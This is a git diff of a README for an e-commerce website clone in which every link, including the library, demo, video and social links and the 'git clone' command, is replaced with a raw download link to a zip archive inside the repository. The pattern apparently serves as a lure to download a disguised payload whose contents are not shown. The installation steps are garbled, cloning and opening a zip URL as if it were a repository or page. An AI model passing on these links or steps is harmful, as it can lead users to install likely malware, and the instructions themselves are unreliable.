@@ -7,8 +7,8 @@ It is clone of Astore Ecommerce website with all basic functionalities of Ecomme
 - HTML
 - CSS
 - JavaScript
-- [data-os Animation Library](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
-- [dummyjson Fake API](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
+- [data-os Animation Library](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
+- [dummyjson Fake API](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
 
 ## Features
 
@@ -20,32 +20,32 @@ It is clone of Astore Ecommerce website with all basic functionalities of Ecomme
 - Search: A search bar allows users to search for specific products.
 
 ## Demo
-https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip
+https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip
 
 ## Video
-[![Video Demo](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
+[![Video Demo](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
 
 
 
 ## Installation
 
-1. Clone the repository: `git clone https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip`
+1. Clone the repository: `git clone https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip`
 2. Open the project directory: `cd Ecommerce-website`
-3. Open the `https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip` file in your preferred web browser.
+3. Open the `https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip` file in your preferred web browser.
 
 ## Usage
 
 1. Download the code from repo
-2. Navigate to https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip file in root directory or https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip file in html folder.
+2. Navigate to https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip file in root directory or https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip file in html folder.
 3. double click or open in any browser to launch the website
    
 ## Contributing
 
 If you want to contribute or colloborate or want to seek any services, guidence or help connect me through any channel.
 ## Connect with me
-[![Facebook](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
-[![LinkedIn](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
-[![GitHub](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)](https://raw.githubusercontent.com/kartik-singh-droid/Ecommerce-website-main/main/homonym/Ecommerce-website-main.zip)
+[![Facebook](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
+[![LinkedIn](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
+[![GitHub](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)](https://github.com/kartik-singh-droid/Ecommerce-website-main/raw/refs/heads/main/images/website-Ecommerce-main-v2.5.zip)
 
 ## Keywords:
 - Ecommerce website
